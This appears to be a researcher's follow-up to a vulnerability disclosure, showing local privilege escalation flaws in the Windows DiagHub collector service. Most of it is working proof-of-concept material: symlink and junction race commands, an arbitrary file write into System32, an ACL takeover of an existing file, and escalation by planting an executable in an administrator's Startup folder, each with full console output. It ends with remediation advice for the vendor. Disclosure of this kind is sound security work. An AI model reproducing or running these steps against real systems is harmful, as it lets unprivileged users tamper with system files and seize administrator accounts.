@@ -1,0 +1,309 @@
+Regarding the "second potential attack vector" I've been talking about in the original submission:
+
+I managed to improve the exploit a little bit, turning it into a file dropping primitive. The attacker has only partial control over the source content,
+so this attack is not really practical in itself. 
+As a preparation step, the exploit creates a object directory based symlink, using James Forshaw's CreateSymlink.exe tool, like this:
+
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock
+Opened Link \RPC Control\lock -> \??\c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock: 00000130
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\metadata.xml c:\Windows\system32\dropped.dll
+Opened Link \RPC Control\metadata.xml -> \??\c:\Windows\system32\dropped.dll: 00000130
+
+The etw (legit), ETW (malicios) and Etw (dir junction) trick is still needed to make the ValidateSamePath method happy. The exploit monitors the report directory,
+once it shows up, it flips the Etw link to point to ETW (where the above links had already been created).
+This also means this is a race condition between Diaghub and the exploit, but the attack is quite reliable.
+
+The fully working example:
+
+C:\111\bin>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+C:\111\bin>DiagHubFileWritePoc.exe
+Usage: DiagHubFileWrite path-to-a-dir-for-scratch path-to-file-to-(over)write
+The target path may be an existing or non-existing file
+
+
+C:\111\bin>DiagHubFileWritePoc.exe c:\111\workdir c:\Windows\system32\dropped.dll
+Case sensitive dir created successfully c:\111\workdir\diaghub-file-write-poc
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-file-write-poc\ETW\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\metadata.xml c:\Windows\system32\dropped.dll
+Preparation succeeded, using report dir Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
+Exeucuting command: VSDiagnostics.exe start 3902E32D-DD66-4419-8A7C-FF37778EFD7F /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-file-write-poc\Etw
+Opened Link \RPC Control\lock -> \??\c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F\lock: 00000130
+Press ENTER to exit and delete the symlink
+Opened Link \RPC Control\metadata.xml -> \??\c:\Windows\system32\dropped.dll: 00000130
+Press ENTER to exit and delete the symlink
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Got the collector service reference
+Scratch path: c:\111\workdir\diaghub-file-write-poc\Etw
+Creating a new session with guid: 3902e32d-dd66-4419-8a7c-ff37778efd7f
+Session created
+Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
+Session 3902E32D-DD66-4419-8A7C-FF37778EFD7F: {3902e32d-dd66-4419-8a7c-ff37778efd7f}
+  Running
+Monitoring report directory to show up: c:\111\workdir\diaghub-file-write-poc\etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
+Executing the report generation process
+Exeucuting command: VSDiagnostics.exe stop 3902E32D-DD66-4419-8A7C-FF37778EFD7F /output:-
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+report dir has shown up, c:\111\workdir\diaghub-file-write-poc\Etw replaced to c:\111\workdir\diaghub-file-write-poc\ETW
+Stop returned with: c:\111\workdir\diaghub-file-write-poc\Etw\Report.3902E32D-DD66-4419-8A7C-FF37778EFD7F
+Session 3902E32D-DD66-4419-8A7C-FF37778EFD7F: {3902e32d-dd66-4419-8a7c-ff37778efd7f}
+  Stopped
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Done!
+
+C:\111\bin>type c:\Windows\system32\dropped.dll
+<?xml version="1.0" encoding="UTF-8"?>
+<Package xmlns="urn:diagnosticshub-package-metadata-2-1">
+  <Tools />
+  <Content />
+  <Metadata>
+    <Item Key="_BuildVersion">10.0.10011.16384</Item>
+  </Metadata>
+</Package>
+
+
+
+Note: since this attack relies on a race condition, you might need to execute the tool multiple times. 
+During my experimentings I found the worst case was 3 executions to mount the attack successfully on a small 
+VM in Azure [Standard B1s (1 vcpus, 1 GiB memory)]. I believe success rate is higher when the monitor 
+thread has a dedicated CPU - on my i7 laptop the attack never failed.
+
+
+Attack vector #3 - file permission takeover of existing files:
+
+While researching this flaw, I found it was possible to abuse the call to SetNamedSecurityInfoW (SecuredDirectory::ExposeDirectory) in a reliable way.
+If you call SetNamedSecurityInfoW with pObjectName specifying a directory junction and request it to propagate inherited ACEs, it won't iterate over the
+sub objects of the container (where the junction points to). But, if you call that function with a link hosted in the object directory, then the permissions
+of the target of the link will be adjusted as requsted.
+
+The stucture would look something like this:
+
+Etw - directory junction originally pointing to etw - this is the path specified for diaghub
+etw - directory used by DiagHub originally to save its payload
+ETW - directory junction pointing to \RPC Control
+\\?\RPC Control\Report.guid link pointing to the file to modify its permissions
+
+
+A fully working example:
+
+C:\111\bin>whoami
+windows-10-dev-\unprivileged
+
+C:\111\bin>icacls c:\Windows\system32\dropped.dll
+c:\Windows\system32\dropped.dll NT AUTHORITY\SYSTEM:(I)(F)
+                                BUILTIN\Administrators:(I)(F)
+                                BUILTIN\Users:(I)(RX)
+                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+
+
+
+C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe
+Usage: DiagHubSetNamedSecurityInfoTakeover path-to-a-dir-for-scratch path-to-file-to-take-over [delay_ms]
+
+Context:
+There is a race condition to win. The operations and their order in DiagHub:
+1) lock file created
+2) metadata.xml file created
+3) SetNamedSecurityInfoW is called on the directory
+
+Successful exploitation needs a junction point to be replaced between 2 and 3.
+If we are too fast, the service won't be able to create metadata.xml (and will throw)
+If we are too slow, SetNamedSecurityInfoW is invoked on the legit target.
+
+This tool monitors the presence of the lock file. Once it shows up, it sleeps a little (3rd parameter)
+then it replaces the junction point. Suggestion: start with zero delay (which is also the default).
+If you see an exception, it means the delay should be increased a bit (recommendation: 10ms)
+If you don't encounter an exception, but the permissions of the destination file are still the original
+you need to decrease the delay.
+
+While this might sound complicated, my experience is that no delay usually works, as SetNamedSecurityInfoW
+is invoked even when the metadata.xml file couldn't be created.
+
+C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe c:\111\workdir c:\Windows\system32\dropped.dll
+Case sensitive dir created successfully c:\111\workdir\diaghub-acl-takeover-poc
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-acl-takeover-poc\ETW\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2 "c:\Windows\system32\dropped.dll"
+Preparation succeeded, using report dir Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2
+Exeucuting command: VSDiagnostics.exe start DACC1E2D-8935-48EE-B65E-067C51F9E2F2 /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-acl-takeover-poc\Etw
+Opened Link \RPC Control\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2 -> \??\c:\Windows\system32\dropped.dll: 00000130
+Press ENTER to exit and delete the symlink
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Got the collector service reference
+Scratch path: c:\111\workdir\diaghub-acl-takeover-poc\Etw
+Creating a new session with guid: dacc1e2d-8935-48ee-b65e-067c51f9e2f2
+Session created
+Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
+Session DACC1E2D-8935-48EE-B65E-067C51F9E2F2: {dacc1e2d-8935-48ee-b65e-067c51f9e2f2}
+  Running
+Monitoring file to show up: c:\111\workdir\diaghub-acl-takeover-poc\etw\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2\lock
+Executing the report generation process
+Exeucuting command: VSDiagnostics.exe stop DACC1E2D-8935-48EE-B65E-067C51F9E2F2 /output:-
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+lock file has shown up, c:\111\workdir\diaghub-acl-takeover-poc\Etw replaced to c:\111\workdir\diaghub-acl-takeover-poc\ETW
+Stop returned with: c:\111\workdir\diaghub-acl-takeover-poc\Etw\Report.DACC1E2D-8935-48EE-B65E-067C51F9E2F2
+Session DACC1E2D-8935-48EE-B65E-067C51F9E2F2: {dacc1e2d-8935-48ee-b65e-067c51f9e2f2}
+  Stopped
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Done! Run:
+icacls c:\Windows\system32\dropped.dll
+
+C:\111\bin>icacls c:\Windows\system32\dropped.dll
+c:\Windows\system32\dropped.dll BUILTIN\Administrators:(F)
+                                NT AUTHORITY\SYSTEM:(F)
+                                windows-10-dev-\unprivileged:(M,DC)
+                                NT AUTHORITY\SYSTEM:(I)(F)
+                                BUILTIN\Administrators:(I)(F)
+                                BUILTIN\Users:(I)(RX)
+                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+
+
+C:\111\bin>echo arbitrary content > c:\Windows\system32\dropped.dll
+
+C:\111\bin>type c:\Windows\system32\dropped.dll
+arbitrary content
+
+
+
+
+Turning attack vector #3 into a privilege escalation:
+
+C:\111\bin>whoami
+windows-10-dev-\unprivileged
+
+C:\111\bin>DiagHubSetNamedSecurityInfoTakeover.exe c:\111\workdir c:\Users\irsl
+Case sensitive dir created successfully c:\111\workdir\diaghub-acl-takeover-poc
+Exeucuting command: CreateSymlink.exe c:\111\workdir\diaghub-acl-takeover-poc\ETW\Report.A8687212-25B5-4536-BEF9-A4BE776C1476 "c:\Users\irsl"
+Preparation succeeded, using report dir Report.A8687212-25B5-4536-BEF9-A4BE776C1476
+Exeucuting command: VSDiagnostics.exe start A8687212-25B5-4536-BEF9-A4BE776C1476 /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:c:\111\workdir\diaghub-acl-takeover-poc\Etw
+Opened Link \RPC Control\Report.A8687212-25B5-4536-BEF9-A4BE776C1476 -> \??\c:\Users\irsl: 00000130
+Press ENTER to exit and delete the symlink
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Got the collector service reference
+Scratch path: c:\111\workdir\diaghub-acl-takeover-poc\Etw
+Creating a new session with guid: a8687212-25b5-4536-bef9-a4be776c1476
+Session created
+Loading agent: e485d7a9-c21b-4903-892e-303c10906f6e -> DiagnosticsHub.StandardCollector.Runtime.dll
+Session A8687212-25B5-4536-BEF9-A4BE776C1476: {a8687212-25b5-4536-bef9-a4be776c1476}
+  Running
+Monitoring file to show up: c:\111\workdir\diaghub-acl-takeover-poc\etw\Report.A8687212-25B5-4536-BEF9-A4BE776C1476\lock
+Executing the report generation process
+Exeucuting command: VSDiagnostics.exe stop A8687212-25B5-4536-BEF9-A4BE776C1476 /output:-
+
+Microsoft (R) VS Standard Collector
+
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+lock file has shown up, c:\111\workdir\diaghub-acl-takeover-poc\Etw replaced to c:\111\workdir\diaghub-acl-takeover-poc\ETW
+Stop returned with: c:\111\workdir\diaghub-acl-takeover-poc\Etw\Report.A8687212-25B5-4536-BEF9-A4BE776C1476
+Session A8687212-25B5-4536-BEF9-A4BE776C1476: {a8687212-25b5-4536-bef9-a4be776c1476}
+  Stopped
+Creating instance of StandardCollector 42cbfaa7-a4a7-47bb-b422-bd10e9d02700 (Windows Native)
+Done! Run:
+icacls c:\Users\irsl
+
+C:\111\bin>icacls c:\Users\irsl
+c:\Users\irsl BUILTIN\Administrators:(F)
+              BUILTIN\Administrators:(OI)(CI)(IO)(F)
+              NT AUTHORITY\SYSTEM:(F)
+              NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+              windows-10-dev-\unprivileged:(M,DC)
+              windows-10-dev-\unprivileged:(OI)(CI)(IO)(RX,M,D,WD,AD,DC,WA)
+              NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(RX)
+              BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+              Everyone:(I)(RX)
+              Everyone:(I)(OI)(CI)(IO)(GR,GE)
+
+Successfully processed 1 files; Failed processing 0 files
+
+
+C:\111\bin>copy DiagHubProof.exe "c:\users\irsl\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+        1 file(s) copied.
+
+Where irsl is a local administrator. After the next time he logs in:
+
+C:\111\bin>type c:\diaghub-proof.txt
+windows-10-dev-\irsl
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+
+
+
+
+Recommendations how to remediate these flaws:
+
+- Save the caller's token at creating the session and impersonate them during the file operations. This would require some refactoring, but would probably the most secure approach.
+- In the SecureDirectory implementation, leverage the file handle already open at the root of the scratch directory (opened in the constructor). Then, at subsequent file operations, 
+  you could rely on NtCreateFile and the POBJECT_ATTRIBUTES parameter, opening the subdirectories and files relative to the handle of the scratch directory itself.
+- Make the comparision case-sensitive (this might break some integrations - but since this is not an officially documented interface, probably shouldn't matter).
+
+Remark:
+- At the GetFinalPathNameByHandleW call, if you consider to traverse the directory path up to the root and verify if any of the path components are case sensitive, remember that
+  this directory attribute on the parent file descriptors can be modified even if there is an open file handle on the scratchdir, and the legit scratchdir ("etw") itself does not 
+  need to be case-sensitive.
+
+And an additional security measure:
+- in DiagHubCommon::DeleteDirectory, verify the return code of RemoveDirectoryW. If it is access denied, abort the operation. This way reparse points
+  would either be removed or files in the destination would remain intact.
+
